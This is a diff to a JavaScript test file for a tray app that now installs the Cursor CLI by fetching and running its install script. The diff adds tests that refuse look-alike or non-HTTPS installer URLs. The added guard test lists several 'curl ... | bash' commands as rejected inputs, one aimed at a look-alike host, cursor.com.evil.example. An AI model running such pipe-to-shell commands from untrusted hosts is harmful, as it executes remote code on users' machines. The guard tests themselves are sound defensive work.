@@ -78,21 +78,16 @@ test("cursor-cli is a sign-in provider and signs in with `login`", () => {
   assert.deepEqual(oauthLoginArgs("cursor-cli"), ["login"]);
 });
 
-test("the tray is never offered a button that would curl|bash on the user's behalf", () => {
-  // With no cursor-agent anywhere, the install path must refuse and name the
-  // command rather than reach for an npm package that does not exist.
+test("a missing cursor-agent is an install action, not a dead end", () => {
+  // This used to assert a refusal that told the user to run curl themselves.
+  // That is a dead end for anyone who is not already a developer, and the npm
+  // siblings of this CLI are installed by the very same button, so the tray
+  // now installs Cursor too. What keeps that defensible is the origin guard
+  // exercised below, plus fetching the script before running it.
   withoutCursorAgent(() => {
-    assert.throws(
-      () => installOauthCli("cursor-cli"),
-      (error) => {
-        assert.match(error.message, /curl https:\/\/cursor\.com\/install/);
-        // The point is that the router refuses to run it, not that the word
-        // "npm" is absent -- the message says it does not come from npm.
-        assert.match(error.message, /Install it yourself/i);
-        return true;
-      },
-      "installing cursor-agent must be refused with the exact command",
-    );
+    const row = providerOnboardingSnapshot().providers.find((p) => p.id === "cursor-cli");
+    assert.equal(row.cliInstalled, false);
+    assert.equal(row.action, "install", "the tray must offer to install it");
   });
 });
 
@@ -117,4 +112,39 @@ test("the tray row tells the truth about a signed-out CLI", () => {
 
 test("model listing survives real chalk decoration", () => {
   assert.deepEqual(parseCursorModels("Available models\n\ngpt-5 - GPT-5 (default)\n"), ["gpt-5"]);
+});
+
+// --- installer guards ----------------------------------------------------
+// The button now fetches and runs Cursor's install script, so the guard that
+// keeps that defensible has to be exercisable without downloading 200MB.
+
+const { installScriptOrigin, signInCliDescriptor } = await import(
+  "../src/provider-onboarding.mjs"
+);
+
+test("the installer URL is pinned to Cursor's own host", () => {
+  const cursor = signInCliDescriptor("cursor-cli");
+  assert.equal(installScriptOrigin(cursor).hostname, "cursor.com");
+  assert.equal(installScriptOrigin(cursor).protocol, "https:");
+});
+
+test("an installer pointed anywhere else is refused before it runs", () => {
+  for (const command of [
+    "curl https://cursor.com.evil.example/install | bash",
+    "curl https://raw.githubusercontent.com/x/y/install.sh | bash",
+    "curl http://cursor.com/install | bash",
+  ]) {
+    assert.throws(
+      () => installScriptOrigin({ executable: "cursor-agent", installCommand: command, installHost: "cursor.com" }),
+      /Refusing to run an installer|Invalid URL/,
+      `${command} must not be fetched`,
+    );
+  }
+});
+
+test("a descriptor with no install URL cannot silently run nothing", () => {
+  assert.throws(
+    () => installScriptOrigin({ executable: "x", installCommand: "make install", installHost: "cursor.com" }),
+    /no install URL/,
+  );
 });
